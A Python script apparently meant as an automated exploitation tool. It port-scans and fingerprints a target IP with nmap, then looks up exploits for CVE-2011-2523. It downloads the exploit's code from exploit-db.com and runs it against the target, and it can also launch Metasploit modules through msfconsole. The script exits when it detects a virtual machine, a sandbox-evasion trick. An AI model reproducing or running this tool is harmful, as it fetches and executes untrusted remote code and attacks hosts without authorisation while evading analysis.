from search_exploit import *
from get_cve import *
from vm_detection import *
from executing import *

import subprocess
import shlex
import shutil
import os
import re
from bs4 import BeautifulSoup
def execute_msf_exploit(exploit_module, target_ip):
    """Executes an exploit module in Metasploit against a target IP."""
    
    msf_path = shutil.which("msfconsole")
    if not msf_path:
        print("[-] Error: msfconsole not found. Ensure Metasploit is installed and in PATH.")
        return

    msf_command = f"{msf_path} -q -x 'use {exploit_module}; set RHOSTS {target_ip}; exploit'"
    
    try:
        print(f"[+] Running: {msf_command}")
        subprocess.run(shlex.split(msf_command), check=True)
        print(f"[+] Exploit {exploit_module} executed successfully on {target_ip}")
    
    except subprocess.CalledProcessError as e:
        print(f"[-] Error executing exploit: {e}")
    except FileNotFoundError:
        print("[-] Error: Metasploit (msfconsole) not found. Check installation.")


def get_exploit_id(search_url):
    """Extracts the first exploit ID from the ExploitDB search page."""
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        response = requests.get(search_url, headers=headers, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error fetching search results: {e}")
        return None

    # Parse the search results page
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Find the first link that matches an exploit entry
    for link in soup.find_all("a", href=True):
        if "/exploits/" in link["href"]:
            exploit_id = link["href"].split("/")[-1]
            return exploit_id

    print("[-] No exploits found for this CVE.")
    return None

def download_exploit(search_url):
    """Finds the exploit ID and downloads the raw exploit."""
    exploit_id = get_exploit_id(search_url)
    if not exploit_id:
        return None

    download_url = f"https://www.exploit-db.com/download/{exploit_id}"
    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        response = requests.get(download_url, headers=headers, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error downloading exploit: {e}")
        return None

    # Ensure the response is not an HTML error page
    if response.text.strip().startswith("<!DOCTYPE html>") or "<html" in response.text:
        print("[-] The downloaded file is an HTML page, not an exploit!")
        return None

    os.makedirs("exploits", exist_ok=True)  # Ensure directory exists

    filename = f"exploits/{exploit_id}.py"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(response.text)

    print(f"[+] Exploit saved as {filename}")
    return filename


if __name__ == "__main__":
    target_ip = "192.168.56.101"

    if is_vm():
        print("The system is running in a virtual machine.")
        exit(1)
    
    nmap_output = subprocess.run(["nmap", "-O", target_ip], capture_output=True, text=True)
    
    os_info = "Unknown"

    for line in nmap_output.stdout.split("\n"):
        if "OS details:" in line:
            os_info = line.split(":", 1)[1].strip()

    print(f"Detected OS: {os_info}")
    
    # cve_list = get_cve()
    # if cve_list:
    #     for cve_info in cve_list:
    #         cve = cve_info["cve"]
    #         print(f"Searching for exploits for {cve}...")
    #         # results = search_exploits(cve)
    #         # execute_msf_exploit(results, target_ip)
            
    exploit_results = search_exploits('2011-2523')

    print("[+] Exploits found:")
    for source, link in exploit_results.items():
        print(f"    {source}: {link}")

    exploit_file = download_exploit(link)

    if exploit_file:
        execute_exploit(exploit_file, target_ip)
        # if results: 
        #     print(f"Found exploits for {cve}:")
        #     for platform, result in results.items():
        #         print(f"{platform}: {result}")
        #     execute_exploit(cve, target_ip)
        # else:
        #     print(f"No exploits found for {cve}.")